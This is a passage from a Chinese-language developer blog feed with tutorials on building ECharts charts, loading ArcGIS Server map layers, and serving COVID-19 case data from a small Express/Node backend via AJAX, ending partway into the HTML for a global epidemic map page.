class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.querySelector(<span class="string">".pie1 .chart"</span>))</span><br><span class="line">    <span class="keyword">var</span> option = &#123;</span><br><span class="line">        color: [<span class="string">'#006cff'</span>, <span class="string">'#60cda0'</span>, <span class="string">'#ed8884'</span>, <span class="string">'#ff9f7f'</span>, <span class="string">'#0096ff'</span>, <span class="string">'#9fe6b8'</span>, <span class="string">'#32c5e9'</span>, <span class="string">'#1d9dff'</span>],</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: <span class="string">'item'</span>,</span><br><span class="line">            formatter: <span class="string">'&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        legend: &#123;</span><br><span class="line">            left: <span class="string">'center'</span>,</span><br><span class="line">            top: <span class="string">'bottom'</span>,</span><br><span class="line">            data: [<span class="string">'rose1'</span>, <span class="string">'rose2'</span>, <span class="string">'rose3'</span>, <span class="string">'rose4'</span>, <span class="string">'rose5'</span>, <span class="string">'rose6'</span>, <span class="string">'rose7'</span>, <span class="string">'rose8'</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        series: [&#123;</span><br><span class="line">            name: <span class="string">'面积模式'</span>,</span><br><span class="line">            type: <span class="string">'pie'</span>,</span><br><span class="line">            <span class="comment">//饼图大小</span></span><br><span class="line">            radius: [<span class="string">'10%'</span>, <span class="string">'70%'</span>],</span><br><span class="line">            center: [<span class="string">'50%'</span>, <span class="string">'50%'</span>],</span><br><span class="line">            <span class="comment">//饼图显示模式area面积模式radius半径模式</span></span><br><span class="line">            roseType: <span class="string">'radius'</span>,</span><br><span class="line">            <span class="comment">// 文本标签控制饼形图文字的相关样式</span></span><br><span class="line">            label: &#123;</span><br><span class="line">                fontSize: <span class="number">10</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 引导线调整</span></span><br><span class="line">            labelLine: &#123;</span><br><span class="line">                <span class="comment">// 连接扇形图线长</span></span><br><span class="line">                length: <span class="number">6</span>,</span><br><span class="line">                <span class="comment">// 连接文字线长</span></span><br><span class="line">                length2: <span class="number">8</span></span><br><span class="line">            &#125;,</span><br><span class="line">            data: [</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">'广东'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">5</span>, <span class="attr">name</span>: <span class="string">'北京'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">15</span>, <span class="attr">name</span>: <span class="string">'武汉'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">25</span>, <span class="attr">name</span>: <span class="string">'浙江'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">20</span>, <span class="attr">name</span>: <span class="string">'上海'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">35</span>, <span class="attr">name</span>: <span class="string">'江苏'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">30</span>, <span class="attr">name</span>: <span class="string">'云南'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">40</span>, <span class="attr">name</span>: <span class="string">'河北'</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    myChart.setOption(option)</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h1 id="载入arcgis-server-的地图服务"><a href="#载入arcgis-server-的地图服务" class="headerlink" title="载入arcgis server 的地图服务"></a>载入arcgis server 的地图服务</h1><p>详细的教程可去官网： <a href="https://developers.arcgis.com/javascript/" target="_blank" rel="noopener">ArcGIS API for JavaScript</a></p><ol><li><p><code>require</code>请求将所需模块加载进去，这里因为想调用<a href="http://www.arcgisonline.cn/" target="_blank" rel="noopener">arcgis online</a> 中的某个地图，经查阅资料得出，通过调用该id号获取其底图（在调用arcgis online的底图时需要登录才能查看该id，详情可以看该<a href="https://jingyan.baidu.com/article/60ccbceb4cc70864cbb1974f.html" target="_blank" rel="noopener">教程</a>），所以需要用到<code>WebMap</code>模块。require以及底图加载代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([</span><br><span class="line">    <span class="comment">//require写什么，后面参数必须按require的顺序写</span></span><br><span class="line">    <span class="string">"esri/WebMap"</span>,</span><br><span class="line">    <span class="string">"esri/views/MapView"</span>, <span class="comment">//地图查看器模块</span></span><br><span class="line">    <span class="string">"esri/layers/FeatureLayer"</span>, <span class="comment">//要素图层</span></span><br><span class="line">    <span class="string">"esri/layers/TileLayer"</span></span><br><span class="line">], <span class="function"><span class="keyword">function</span>(<span class="params">WebMap, MapView, FeatureLayer, TileLayer</span>) </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//基础底图</span></span><br><span class="line">    <span class="comment">// var map = new Map(&#123;</span></span><br><span class="line">    <span class="comment">//     basemap: "streets-night-vector" //底图样式</span></span><br><span class="line">    <span class="comment">// &#125;);</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//id号获取底图</span></span><br><span class="line">    <span class="keyword">var</span> map = <span class="keyword">new</span> WebMap(&#123;</span><br><span class="line">        portalItem: &#123;</span><br><span class="line">            id: <span class="string">"bf024b8d0b4b48f5a486070214e87c5f"</span> <span class="comment">//ArcGIS Online</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> view = <span class="keyword">new</span> MapView(&#123;</span><br><span class="line">        container: <span class="string">"viewDiv"</span>,</span><br><span class="line">        map: map,</span><br><span class="line">        center: [<span class="number">116.26</span>, <span class="number">24.2</span>], <span class="comment">// longitude, latitude 地理坐标</span></span><br><span class="line">        zoom: <span class="number">3</span> <span class="comment">//缩放程度s</span></span><br><span class="line">    &#125;);</span><br><span class="line">   </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>通过调用在arcgis server发布的地图服务url，将要显示的要素图层加载进去，然后在本地就可以浏览echarts和arcgis server结合的简单案例啦，调用url代码在回调函数中，如下所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加Traiheads要素图层</span></span><br><span class="line"><span class="keyword">var</span> china = <span class="keyword">new</span> FeatureLayer(&#123;</span><br><span class="line">    url: <span class="string">"http://localhost:6080/arcgis/rest/services/Text/text/MapServer"</span>, <span class="comment">//url:....../1:行政区图层索引号</span></span><br><span class="line">    <span class="comment">//数组存放标题和内容</span></span><br><span class="line">    outFields: [<span class="string">"Name"</span>, <span class="string">"性别比"</span>],</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//显示路径名称和弹出窗口的字段</span></span><br><span class="line">    popupTemplate: &#123; <span class="comment">// 启动弹出模板</span></span><br><span class="line">        <span class="string">"title"</span>: <span class="string">"&#123;Name&#125;"</span>, <span class="comment">// 标题名</span></span><br><span class="line">        <span class="string">"content"</span>: <span class="string">"&lt;p&gt;该省性别比为&lt;/p&gt; &lt;p&gt;&#123;性别比&#125;。&lt;/p&gt;"</span> <span class="comment">// 弹出框文本内容</span></span><br><span class="line">    &#125;,</span><br><span class="line">    opacity: <span class="number">.4</span> <span class="comment">//透明程度</span></span><br><span class="line">&#125;);</span><br><span class="line">map.add(china);</span><br></pre></td></tr></table></figure></li><li><p>成果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/Echarts/image-20200719215053753.png" alt="image-20200719215053753"></p></li></ol><h1 id="后台搭建服务器"><a href="#后台搭建服务器" class="headerlink" title="后台搭建服务器"></a>后台搭建服务器</h1><ol><li><p>整理好相关文件</p></li><li><p>创建整理文件夹</p><ul><li>public（存放js、css、图片文件）</li><li>views（存放html页面）</li></ul></li><li><p>下载所需基础模块(下载模块前记得初始化package文件)</p><ul><li>jQuery</li><li>Bootstrap（可能用不到）</li><li>body-parser（最后发现用不到）</li><li>express</li><li>mongoose(本来打算连接芒果数据库的数据，最后发现本地有一个json格式的疫情数据，就用不上这个模块了)</li><li>art-template（模板引擎）</li></ul></li><li><p>设计路由，因为这里简单只需用到渲染页面以及返回数据的路由，所以偷个懒</p></li><li><p>初始化app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">//引入fs模块，用来读取疫情数据</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//body-parse中间件配置</span></span><br><span class="line"><span class="comment">// parse application/x-www-form-urlencoded</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"><span class="comment">// parse application/json</span></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"></span><br><span class="line"><span class="comment">//模板引擎 engine后面没有r谢谢</span></span><br><span class="line">app.engine(<span class="string">'html'</span>, <span class="built_in">require</span>(<span class="string">'express-art-template'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//开放静态资源</span></span><br><span class="line">app.use(<span class="string">'/public'</span>, express.static(<span class="string">'./public/'</span>))</span><br><span class="line">app.use(<span class="string">'/node_modules'</span>, express.static(<span class="string">"./node_modules/"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//首页渲染</span></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//post请求返回疫情数据</span></span><br><span class="line">app.post(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//开放端口</span></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"server is running..."</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>渲染页面（get路由）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(<span class="string">'index.html'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>分析json文件</p><p>这里因为只需要中国地区城市的疫情数据，所以需要进行筛选</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/Echarts/image-20200716100603807.png" alt="image-20200716100603807"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/Echarts/image-20200716100627300.png" alt="image-20200716100627300"></p><p>从数据可以看出，数组内第一个对象即为中国的疫情状况，所以这里直接读取第一个对象即可，用fs模块读取整个json文件，因为读取后的数据是json格式，使用json.parse将其转化为对象格式，再从里面的cities获取中国城市的疫情数据，记得读取文件时加上<code>utf8</code>参数，否则会出现乱码，下面放出代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    fs.readFile(<span class="string">'./public/DXYArea.json'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'error'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// console.log(data)</span></span><br><span class="line">        <span class="keyword">var</span> virus = <span class="built_in">JSON</span>.parse(data).results</span><br><span class="line">        <span class="built_in">console</span>.log(virus)</span><br><span class="line">        <span class="keyword">var</span> cn = virus[<span class="number">0</span>].cities</span><br><span class="line">        res.send(cn)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>到这里，后台搭建就准完毕，可以浏览器访问<code>localhost:3000</code>查看基础页面</p></li></ol><h1 id="ajax配合echarts使用"><a href="#ajax配合echarts使用" class="headerlink" title="ajax配合echarts使用"></a>ajax配合echarts使用</h1><blockquote><p>这里，其实思考过几种方法，一种是通过后台获取数据然后利用模板引擎将数据转到前端隐藏控件中去读取然后进行数据渲染，详情可参考这篇文章<a href="https://blog.csdn.net/tksnail/article/details/88096072，但是里面的数据较为简单，而这边是一整个对象数组，转到前端去就全部变成字符串类型，除非先在后台对数据进行处理，转成一个一个数组后传递到前端，但我想尝试在前端的Ajax中处理。所以自己摸索研究了一下" target="_blank" rel="noopener">https://blog.csdn.net/tksnail/article/details/88096072，但是里面的数据较为简单，而这边是一整个对象数组，转到前端去就全部变成字符串类型，除非先在后台对数据进行处理，转成一个一个数组后传递到前端，但我想尝试在前端的Ajax中处理。所以自己摸索研究了一下</a></p></blockquote><ol><li><p>在放有echarts的js文件中，在想要引用数据的图表中，建立Ajax，代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/'</span>,</span><br><span class="line">    type: <span class="string">'post'</span>,</span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">    dataType: <span class="string">'json'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>分析数据，依旧是对象格式，这很棒，然后就想着怎么拿里面数据，这里要拿到城市名和疫情状况，字段名分别是<code>cityName</code>和<code>confirmedCount</code>，这里在ajax外定义两个数组用来存放数据，，接着在通过for循环将数据存入数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">    city.push(data[i].cityName)</span><br><span class="line">    num.push(data[i].confirmedCount)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后需要重新配置图表用以更新数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//必须在这里在设置一遍，这里涉及到的问题不太懂，只知道如不再设置，而在ajax外赋值是没有作用的</span></span><br><span class="line">myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">    xAxis: &#123;</span><br><span class="line">        data: city</span><br><span class="line">    &#125;,</span><br><span class="line">    series: [&#123;</span><br><span class="line">        <span class="comment">// 根据名字对应到相应的系列</span></span><br><span class="line">        data: num</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> city = []</span><br><span class="line"><span class="keyword">var</span> num = []</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/'</span>,</span><br><span class="line">    type: <span class="string">'post'</span>,</span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">    dataType: <span class="string">'json'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            city.push(data[i].cityName)</span><br><span class="line">            num.push(data[i].confirmedCount)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// myChart.hideLoading()</span></span><br><span class="line">        <span class="comment">//必须在这里在设置一遍，这里涉及到的问题不太懂（可能是同步异步的问题，后面再去补齐这一部分理论），只知道如不再设置，而在ajax外赋值是没有作用的</span></span><br><span class="line">        myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">            xAxis: &#123;</span><br><span class="line">                data: city</span><br><span class="line">            &#125;,</span><br><span class="line">            series: [&#123;</span><br><span class="line">                <span class="comment">// 根据名字对应到相应的系列</span></span><br><span class="line">                data: num</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>这里，echarts搭配node以及ajax的学习过程就完成啦，后面会将整个<a href="https://ypigy.gitee.io/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/" target="_blank" rel="noopener">疫情地图</a>的小项目完成放在自己的博客上。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Echarts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Echarts </tag>
            
            <tag> ArcGIS Server </tag>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全球疫情地图</title>
      <link href="/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/"/>
      <url>/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学了Echarts之后，也在看到官网上有很多包括地图的实例，于是想着如何创建一个能够动态更新的疫情地图，鉴于国内疫情情势总体向好，而全球的疫情并不乐观的情况下，便制作了全球的疫情地图，这篇博客的教程也是基于上一篇的<a href="https://ypigy.gitee.io/2020/07/20/Echarts/" target="_blank" rel="noopener">Echarts</a>学习。</p><h2 id="所需基础知识"><a href="#所需基础知识" class="headerlink" title="所需基础知识"></a>所需基础知识</h2><ol><li>html、css、js</li><li>ajax</li><li>JQuery</li><li>Echarts</li></ol><h1 id="总体界面设计"><a href="#总体界面设计" class="headerlink" title="总体界面设计"></a>总体界面设计</h1><blockquote><p>首先便是将页面搭建起来啦，这里我选择展示的数据分别是疫情地图（中心位置），各国确诊人数饼状图（仿人民日报类型，右边位置），全球疫情趋势（左下角）以及各大洲疫情状况（左上角），这里页面设计是基于b站Echarts学习的页面设计改动的，剔除了两三个图表</p></blockquote><ol><li>创建对应文件夹，用来存放静态资源</li><li>设计地图界面，这里采用3 6 3的flex布局</li><li>页面代码书写</li><li>css样式书写</li><li>右上角实时时间代码书写</li></ol><p>html页面的代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>全球疫情地图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--     &lt;link rel="stylesheet" href="Bootstrap/css/bootstrap.min.css"&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--     &lt;script src="Bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/echarts.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span> 全球疫情地图 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"showTime"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"index"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://pigs_on_the_horizon.gitee.io/"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"mainbox"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 左 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel bl bar"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>各洲累计确诊分布（海外）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel bl line"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>全球疫情趋势（海外）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 中 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 上模块 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no-hd"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"no-bd"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                        